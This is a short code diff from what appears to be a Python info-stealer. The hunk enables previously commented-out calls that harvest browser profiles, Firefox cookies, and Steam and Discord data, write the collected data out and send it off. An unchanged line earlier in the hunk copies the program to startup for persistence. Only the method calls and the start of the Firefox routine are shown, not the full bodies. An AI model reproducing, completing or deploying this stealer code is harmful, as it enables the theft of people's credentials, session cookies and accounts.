@@ -117,12 +117,12 @@ class QuicaxdExela:
         self.growtopiaa = []     
         if not startup_xd == "no-startup":
             self.copyToStartup()   
-        #self.doitEveryProfile()
-        #self.callMozilla()
-        #self.setSteam()
-        #self.setDiscord()
-        #self.writeAllData()
-        #self.sendxd()
+        self.doitEveryProfile()
+        self.callMozilla()
+        self.setSteam()
+        self.setDiscord()
+        self.writeAllData()
+        self.sendxd()
     def callMozilla(self):
         self.GetMozillaProfiles()
         self.get_cookies_firefox()
